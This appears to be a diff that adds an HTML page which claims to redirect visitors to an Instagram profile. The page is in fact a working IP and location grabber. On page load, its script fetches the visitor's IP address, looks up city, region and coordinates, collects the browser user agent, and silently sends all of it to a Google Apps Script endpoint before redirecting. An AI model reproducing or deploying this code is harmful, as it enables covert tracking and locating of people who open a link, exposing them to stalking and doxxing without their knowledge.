@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8">
+  <title>正在跳轉中...</title>
+  <style>#map { height: 200px; width: 100%; margin-bottom: 10px; }</style>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+</head>
+<body>
+  <p>正在跳轉到 IG</p>
+  <div id="map"></div>
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+  (async () => {
+    try {
+      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+      const ip = ipData.ip;
+      const ua = navigator.userAgent;
+
+      const locData = await fetch(`https://ipwho.is/${ip}`).then(res => res.json());
+
+      const info = {
+        ip,
+        country: locData.country || "",
+        region: locData.region || "",
+        city: locData.city || "",
+        lat: locData.latitude || 0,
+        lon: locData.longitude || 0,
+        ua
+      };
+
+      await fetch("https://script.google.com/macros/s/AKfycbzDEWIlVVUkb0gyi4byF-wxBnXSeTGVRZFrLsYKGPukdjDhlpu2HvVlKobyy7tsmuyr/exec", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(info)
+      });
+
+      if (info.lat && info.lon) {
+        const map = L.map('map').setView([info.lat, info.lon], 8);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          attribution: '&copy; OpenStreetMap contributors'
+        }).addTo(map);
+        L.marker([info.lat, info.lon]).addTo(map)
+          .bindPopup(`${info.city}, ${info.region}, ${info.country}`)
+          .openPopup();
+      }
+    } catch (e) {
+      console.error(e);
+    } finally {
+      window.location.replace("instagram://user?username=_1naux.1");
+    }
+  })();
+  </script>
+</body>
+</html>
